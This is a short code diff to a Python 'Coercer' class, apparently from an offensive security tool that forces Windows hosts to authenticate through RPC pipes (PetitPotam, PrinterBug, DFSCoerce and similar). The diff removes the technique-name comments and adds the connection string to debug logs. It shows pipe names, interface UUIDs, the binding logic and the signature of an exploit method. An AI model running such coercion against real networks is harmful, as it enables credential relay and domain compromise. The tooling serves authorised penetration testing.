@@ -108,21 +108,21 @@ class Coercer:
             "MS_EVEN": "CheeseOunce"
         }
         config = {
-            "MS_FSRVP": [ #ShadowCoerce
+            "MS_FSRVP": [
                 {
                     "protocol": "ncacn_np",
                     "pipeName":  "Fssagentrpc",
                     "MSRPC_UUID": ("a8e0653c-2744-4389-a61d-7373df8b2292", "3.0"),
                 },
             ],
-            "MS_DFSNM": [ #DFSCoerce
+            "MS_DFSNM": [
                 {
                     "protocol": "ncacn_np",
                     "pipeName": "netdfs",
                     "MSRPC_UUID": ("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0"),
                 }
             ],
-            "MS_EFSR": [ #Petitpotam
+            "MS_EFSR": [
                 {
                     "protocol": "ncacn_np",
                     "pipeName": "lsarpc",
@@ -149,7 +149,7 @@ class Coercer:
                     "MSRPC_UUID": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
                 }
             ],
-            "MS_RPRN": [ #PrinterBug
+            "MS_RPRN": [
                 {
                     "protocol": "ncacn_np",
                     "pipeName": "spoolss",
@@ -161,7 +161,7 @@ class Coercer:
                     "MSRPC_UUID": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                 },
             ],
-            "MS_EVEN": [ #MSEven
+            "MS_EVEN": [
                 {
                     "protocol": "ncacn_np",
                     "pipeName": "eventlog",
@@ -202,9 +202,9 @@ class Coercer:
             dce.connect()
             dce.bind(uuidtup_to_bin(coerce_method["MSRPC_UUID"]))
         except Exception as e:
-            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
+            self.context.log.debug(f"Something went wrong when connect to {stringBinding}, check error status => {e!s}")
             return None
-        self.context.log.debug("[+] Successfully bound!")
+        self.context.log.debug(f"[+] Successfully bound to {stringBinding}!")
         return dce
     
     def exploit(self, dce, target, listener, always_continue, ms_protocolName, exploitName, pipeName):
